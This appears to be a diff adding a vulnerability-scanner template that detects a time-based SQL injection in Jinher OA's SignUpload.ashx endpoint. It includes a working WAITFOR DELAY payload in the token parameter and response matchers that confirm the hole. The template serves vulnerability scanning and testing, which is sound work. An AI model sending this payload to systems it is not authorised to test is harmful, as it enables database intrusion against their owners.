@@ -1,0 +1,45 @@
+id: poc-yaml-jinher-signupload-sqli
+info:
+  name: 金和OA SignUpload SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{to_gbk("应用程序中的服务器错误")}}'
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-check
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Jhsoft.Web.login"
+      - type: status
+        status:
+          - 200
+
+  - id: sqli-check
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.ask/SignUpload.ashx?token=1%3BWAITFOR+DELAY+%270%3A0%3A%20{{t1}}%27+--%20and%201=1_123_123&filename=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
+      - type: dsl
+        dsl:
+          - "duration > t1"
+          - "duration < t2"
+      - type: status
+        status:
+          - 500
